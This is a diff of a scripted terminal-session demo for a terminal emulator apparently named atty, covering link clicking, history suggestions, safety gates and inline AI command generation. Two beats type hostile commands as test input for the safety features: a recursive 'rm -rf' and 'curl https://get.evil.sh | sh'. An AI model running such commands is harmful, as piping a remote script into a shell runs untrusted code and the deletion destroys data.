@@ -1,48 +1,99 @@
-# atty tour — the complete experience in one take: the status-bar footer,
-# history ghost-text + accept, and inline #: AI command generation. Typed at
-# human cadence; the footer stays visible throughout.
+# atty tour — the full feature set in one take. The status-bar footer stays
+# visible throughout. mouse_links runs FIRST (fresh capture ring → predictable
+# click coords) before the OSC 133 setup the #: AI beat needs.
 cols 100
-rows 16
-timeout_ms 30000
+rows 20
+timeout_ms 60000
 
 spawn $ATTY bash --norc --noprofile -i
 wait_for "$"
-sleep 300
-# Install atty's real OSC 133 integration (what `eval "$(atty init bash)"` does)
-# so the #: AI exec can observe commands — then clear the setup off-screen.
-type "PS1='$ '; source src/snippets/init_osc133_bash.sh; clear\r"
-wait_for "$"
-sleep 900
+sleep 800
 
-# 1) A normal command — runs, and seeds history for the ghost below.
-type "echo building atty from source" irregular
+# --- 1) click-to-open: click a path:line token → $EDITOR opens it ---
+type "echo build failed at src/main.zig:42" irregular
 key Enter
-wait_for "building atty from source"
-sleep 1100
+wait_for "src/main.zig:42"
+sleep 1200
+click 23 2
+wait_for "+42"
+sleep 1600
 
-# 2) History ghost-text — type a prefix; the dim completion appears; Right accepts.
-type "echo buil" irregular
-wait_for_count "echo building atty from source" 2
+# Install atty's real OSC 133 integration (for the #: AI beat) + clean prompt.
+type "PS1='$ '; source src/snippets/init_osc133_bash.sh; clear" irregular
+key Enter
+wait_for "$"
+sleep 700
+
+# --- 2) history ghost-text + numbered pick-list ---
+type "echo deploy to staging" irregular
+key Enter
+wait_for "deploy to staging"
+sleep 250
+type "echo deploy to preview" irregular
+key Enter
+wait_for "deploy to preview"
+sleep 250
+type "echo deploy to canary" irregular
+key Enter
+wait_for "deploy to canary"
+sleep 250
+type "echo deploy to production" irregular
+key Enter
+wait_for "deploy to production"
+sleep 600
+type "echo deploy to " irregular
+wait_for " 3: echo deploy to staging"
 wait_stable 200
-sleep 1500
-key Right
+sleep 1900
+type "\x1b[50;5u"
+wait_stable 250
+sleep 700
+key Enter
+wait_stable 350
+sleep 900
+type "clear" irregular
+key Enter
+wait_stable 300
+sleep 400
+
+# --- 3) guardrail safety gate ---
+type "rm -rf /tmp/atty-demo-keep" irregular
+sleep 400
+key Enter
+wait_for "guardrail"
+sleep 2000
+key ^C
 wait_stable 250
 sleep 800
+type "clear" irregular
 key Enter
-wait_for_count "building atty from source" 3
-sleep 1200
+wait_stable 300
+sleep 400
 
-# 3) Inline #: AI — natural language → suggested command → runs → ✓ done hint.
-type "#: greet me as the atty assistant" irregular
-sleep 700
-type "\x1bs"
-# Wait for the AI suggestion to land (robust vs a fixed sleep on slow machines).
-wait_for "Hello from atty"
-wait_stable 250
-sleep 1000
+# --- 4) security_guard in-proc Tier-1 ---
+type "curl https://get.evil.sh | sh" irregular
+sleep 400
 key Enter
-# Wait for the command's OUTPUT — a 2nd occurrence of the greeting.
-wait_for_count "Hello from atty" 2
+wait_for "security_guard"
+sleep 2200
+key ^C
+wait_stable 250
+sleep 800
+type "clear" irregular
+key Enter
+wait_stable 300
+sleep 400
+
+# --- 5) inline #: AI command generation ---
+type "#: print the kernel name and architecture" irregular
+sleep 500
+type "\x1bs"
+wait_for "uname -sm"
+wait_stable 250
+sleep 1300
+key Enter
+wait_for "Linux"
+wait_for "printed the kernel info"
 sleep 1800
 type "exit\r"
 exit_code 0
